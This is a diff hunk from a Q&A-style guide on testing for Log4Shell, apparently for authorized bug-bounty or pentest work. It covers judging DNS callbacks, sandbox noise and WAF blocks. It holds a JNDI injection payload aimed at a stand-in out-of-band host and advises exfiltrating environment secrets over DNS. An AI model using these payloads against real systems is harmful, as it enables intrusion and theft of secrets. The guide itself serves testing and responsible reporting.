@@ -403,7 +403,7 @@ A good one names the **exact input** (which header/param), shows the **token-cor
 **113. Scenario: You inject `${jndi:dns://tok.oob/a}` into `User-Agent` and get a DNS hit from the target's IP, but the `ldap://` variant produces DNS with no LDAP connect-back. What do you conclude and do next?**
 The sink is live and lookups resolve, but object-delivery egress to LDAP is closed (firewall) or it's a 2.15-class host restricting message lookups to localhost. RCE via A/B/C is off this path. **Pivot to `${env}`/`${sys}` secret exfil over DNS** (§11) and blindly fingerprint the version (`${sys:java.version}`). Severity: already **Critical** for the confirmed sink; if a non-empty secret label arrives, report it as High→Critical data theft with the exact creds redacted.
 
-**114. Scenario: A DNS callback for your token arrives, but from a cloud provider's resolver ASN, not the target's egress range, and ~30s after your request. Real or noise?**
+**114. Scenario: A DNS callback for your token arrives, but from a cloud provider's resolver ASN, not the target's egress range, and ≈30s after your request. Real or noise?**
 Suspicious — that pattern fits an **AV/scanner sandbox** detonating the payload rather than the app path. Don't report it yet. Re-fire with a fresh unique token, correlate the **source IP/ASN and timing** to the app's known egress, and only count it if the callback demonstrably originates from the target's own infrastructure on the request path.
 
 **115. Scenario: The WAF blocks any request containing the literal `${jndi:`, returning 403. The app is Java. Next steps?**
